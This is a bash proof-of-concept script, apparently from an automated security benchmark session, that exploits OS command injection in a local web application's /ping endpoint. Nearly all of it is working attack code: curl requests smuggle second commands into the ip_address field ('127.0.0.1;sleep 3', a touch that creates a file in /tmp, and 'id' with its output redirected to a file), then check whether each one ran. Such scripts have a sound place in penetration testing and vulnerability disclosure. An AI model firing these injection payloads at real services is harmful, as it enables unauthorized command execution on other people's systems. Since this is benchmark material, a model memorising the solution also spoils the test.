#!/bin/bash
# POC: Demonstrates OS command injection via semicolon separator in the /ping endpoint's ip_address parameter. Shows arbitrary command execution capabilities including timing-based injection, file creation, and command output capture.
# Target: ./repo
# Created: 2025-11-10T15:04:15.131Z
# Session: benchmark-XBEN-037-24-mht9nqa0

# OS Command Injection POC for /ping endpoint
# Target: POST /ping with ip_address parameter
# Vulnerability: Semicolon command separator allows arbitrary OS command execution

TARGET_URL="http://127.0.0.1:80/ping"
CLEANUP_FILE="/tmp/pwned_poc_test.txt"

echo "[*] OS Command Injection POC - /ping Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Timing-based injection with sleep
echo "[TEST 1] Timing-based command injection using sleep"
echo "[*] Sending payload: 127.0.0.1;sleep 3"
start_time=$(date +%s%N)
response=$(curl -s -X POST -d "ip_address=127.0.0.1;sleep 3" "$TARGET_URL")
end_time=$(date +%s%N)
elapsed_ms=$(( (end_time - start_time) / 1000000 ))

echo "[*] Response time: ${elapsed_ms}ms"
if [ $elapsed_ms -ge 3000 ]; then
    echo "[+] SUCCESS: Sleep command executed (timing difference indicates injection)"
else
    echo "[-] FAILED: No significant delay detected"
fi
echo ""

# Test 2: File creation injection
echo "[TEST 2] Arbitrary file creation via command injection"
echo "[*] Sending payload: 127.0.0.1;touch /tmp/pwned_poc_test.txt"
curl -s -X POST -d "ip_address=127.0.0.1;touch $CLEANUP_FILE" "$TARGET_URL" > /dev/null

sleep 1

if [ -f "$CLEANUP_FILE" ]; then
    echo "[+] SUCCESS: File created at $CLEANUP_FILE"
    ls -la "$CLEANUP_FILE"
else
    echo "[-] FAILED: File was not created"
fi
echo ""

# Test 3: Command output capture via file redirection
echo "[TEST 3] Command output extraction"
echo "[*] Sending payload: 127.0.0.1;id > /tmp/id_output_test.txt"
curl -s -X POST -d "ip_address=127.0.0.1;id > /tmp/id_output_test.txt" "$TARGET_URL" > /dev/null

sleep 1

if [ -f "/tmp/id_output_test.txt" ]; then
    echo "[+] SUCCESS: Command output captured"
    echo "[*] File contents:"
    cat /tmp/id_output_test.txt
else
    echo "[-] FAILED: Output file not created"
fi
echo ""

# Cleanup
echo "[*] Cleaning up test files..."
rm -f "$CLEANUP_FILE" "/tmp/id_output_test.txt"
echo "[+] Cleanup complete"
echo ""
echo "[+] POC Demonstration Complete"